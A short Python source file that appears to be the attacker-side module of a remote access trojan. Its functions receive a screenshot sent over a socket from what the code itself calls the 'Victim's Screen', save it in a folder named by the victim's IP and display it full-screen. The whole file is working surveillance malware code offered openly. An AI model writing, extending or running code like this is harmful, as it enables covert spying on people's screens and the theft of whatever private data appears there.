import os
import cv2
import pyautogui




def screenshot(conn,ip):
    print("conn ip ",conn, ip)
    print("Capturing Screenshot of Victim's Screen")
    l=int(conn.recv(20480).decode())
    conn.send("start".encode())
    curr_len=0
    f=open(os.path.join(ip,"ss.jpg"),"wb")

    while curr_len<l:
        print("",end="\r")
        data=conn.recv(2048000)
        f.write(data)
        curr_len+=len(data)
        print("Transfer Progress: {a:.2f} %".format(a=(curr_len/l)*100),end="")

    f.close()
    print("\nSuccessfully Captured Screenshot from Victim")
    conn.send("done".encode())
    show_image(ip)
    output=conn.recv(20480).decode()
    print(output,end="") 


def show_image(ip):
    im=cv2.imread(os.path.join(ip,'ss.jpg'))
    SCREEN_SIZE=pyautogui.size()
    cv2.namedWindow("Screenshot",cv2.WINDOW_NORMAL)
    cv2.resizeWindow("Screenshot",SCREEN_SIZE[0],SCREEN_SIZE[1])
    cv2.imshow("Screenshot",im)
    cv2.waitKey(3000)
    cv2.destroyAllWindows()

